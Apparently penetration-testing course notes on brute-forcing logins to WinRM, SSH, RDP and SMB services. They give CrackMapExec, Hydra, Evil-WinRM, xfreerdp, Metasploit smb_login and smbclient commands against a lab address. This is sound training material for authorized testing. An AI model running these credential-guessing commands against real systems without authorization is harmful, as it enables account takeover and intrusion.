### WinRM

Windows Remote Management (WinRM) is Microsoft’s implementation of the WS-Management (Web Services Management) protocol. This protocol, built on XML web services and utilizing Simple Object Access Protocol (SOAP), enables remote management of Windows systems. WinRM facilitates communication between Web-Based Enterprise Management (WBEM) and Windows Management Instrumentation (WMI), which can interact with the Distributed Component Object Model (DCOM).
However, for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`). A handy tool that we can use for our password attacks is [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the [official documentation](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/) for this tool to become familiar with it.
#### CrackMapExec

```shell-session
$ sudo apt-get -y install crackmapexec
```
```shell-session
$ crackmapexec smb -h
```
```shell-session
$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```shell-session
$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```
The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

#### Evil-WinRM
#### Installing Evil-WinRM
```shell-session
$ sudo gem install evil-winrm
```
```shell-session
$ evil-winrm -i <target-IP> -u <username> -p <password>
```
```shell-session
$ evil-winrm -i 10.129.42.197 -u user -p password
```
If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

### SSH

Secure Shell (SSH) is a secure protocol used to remotely execute system commands or transfer files. It operates on TCP port 22 by default and involves three cryptographic methods: symmetric encryption, asymmetric encryption, and hashing.

- **Symmetric Encryption:** Uses the same key for both encryption and decryption. A secure key exchange, such as Diffie-Hellman, ensures the key remains secret. Common algorithms include AES, Blowfish, and 3DES.
  
- **Asymmetric Encryption:** Involves a public and private key pair. Messages encrypted with the public key can only be decrypted by the corresponding private key, securing the connection.

- **Hashing:** Converts data into a unique value to verify message authenticity, using a one-way mathematical algorithm.
#### Hydra - SSH
 ```shell-session
$ hydra -L user.list -P password.list ssh://10.129.42.197
```

### Remote Desktop Protocol (RDP)

Microsoft's Remote Desktop Protocol (RDP) enables remote access to Windows systems over TCP port 3389. RDP allows both users and administrators to connect to and control Windows hosts remotely. The protocol operates between two components: the terminal server (where the work occurs) and the terminal client (which controls the server remotely). RDP supports transferring images, sound, keyboard inputs, and mouse control, as well as printing to local printers and accessing local storage. It functions at the application layer of the IP stack and uses both TCP and UDP for data transmission. While primarily used by Microsoft apps, third-party solutions also utilize RDP.
#### Hydra - RDP
```shell-session
$ hydra -L user.list -P password.list rdp://10.129.42.197
```
#### xFreeRDP
```shell-session
$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
```shell-session
$ xfreerdp /v:10.129.42.197 /u:user /p:password
```


#### Hydra - SMB
```shell-session
$ hydra -L user.list -P password.list smb://10.129.42.197
```
#### Hydra - Error
```shell-session
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

```shell-session
msf6 > use auxiliary/scanner/smb/smb_login

msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run
```
#### CrackMapExec
```shell-session
$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```
#### Smbclient
```shell-session
$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```